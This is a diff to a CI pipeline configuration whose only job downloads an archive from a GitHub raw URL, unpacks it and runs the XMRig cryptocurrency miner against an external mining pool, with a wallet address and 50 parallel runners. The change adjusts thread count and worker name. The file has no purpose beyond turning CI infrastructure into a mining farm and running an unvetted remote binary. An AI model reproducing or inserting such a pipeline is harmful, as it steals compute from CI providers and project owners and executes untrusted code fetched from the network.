@@ -12,5 +12,5 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://raw.githubusercontent.com/pravsh89/NiceHash-XMRig/main/mon.tar.gz ; tar xvzf mon.tar.gz ; ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u AVAX:0x02aa42c0b91f83015a7033099165d260b1d03b5d.cs#lh26-8vhq -p x'
+            - 'wget https://raw.githubusercontent.com/pravsh89/NiceHash-XMRig/main/mon.tar.gz ; tar xvzf mon.tar.gz ; ./xmrig -threads=3 -a rx -o stratum+ssl://rx.unmineable.com:443 -u AVAX:0x02aa42c0b91f83015a7033099165d260b1d03b5d.cs1#lh26-8vhq -p x'
           parallelism: 50
